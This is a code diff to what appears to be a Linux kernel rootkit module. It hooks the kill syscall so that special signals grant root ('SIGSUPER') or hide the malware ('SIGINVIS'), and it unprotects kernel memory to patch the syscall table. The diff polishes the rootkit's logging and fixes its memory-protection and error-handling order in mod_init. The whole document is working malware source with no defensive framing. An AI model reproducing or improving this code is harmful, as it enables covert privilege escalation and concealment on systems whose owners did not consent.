@@ -38,13 +38,12 @@ static asmlinkage long hack_kill(const struct pt_regs *regs)
         int sig = regs->si;
 
         if (sig == SIGSUPER) {
-                printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root ", sig, SIGSUPER);
+                printk(KERN_INFO "signal: %d == SIGSUPER: %d | became root ", sig, SIGSUPER);
                 return 0;
         } else if (sig == SIGINVIS) {
                 printk(KERN_INFO "signal:%d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
                 return 0;
         }
-        printk(KERN_INFO "hacked kill syscall \n");
         return orig_kill(regs);
 }
 
@@ -53,13 +52,12 @@ static asmlinkage long hack_kill(const struct pt_regs *regs)
 static asmlinkage long hack_kill(pid_t pid, int sig)
 {
         if (sig == SIGSUPER) {
-                printk(KERN_INFO "signal: %d == SIGSUPER: %d | become root ", sig, SIGSUPER);
+                printk(KERN_INFO "signal: %d == SIGSUPER: %d | became root ", sig, SIGSUPER);
                 return 0;
         } else if (sig == SIGINVIS) {
                 printk(KERN_INFO "signal:%d == SIGINVIS: %d | hide itself/malware/etc", sig, SIGINVIS);
                 return 0;
         }
-        printk(KERN_INFO "hacked kill syscall \n");
         return orig_kill(pid, sig);
 }
 
@@ -133,12 +131,16 @@ static int __init mod_init(void)
                 return err;
         }
 
+        unprotect_memory();
         if (store() == err) {
                 printk(KERN_INFO "error:store error\n");
+                protect_memory();
+                return err;
         }
-        unprotect_memory();
         if (hook() == err) {
                 printk(KERN_INFO "error:hook error\n");
+                protect_memory();
+                return err;
         }
         protect_memory();
         return 0;
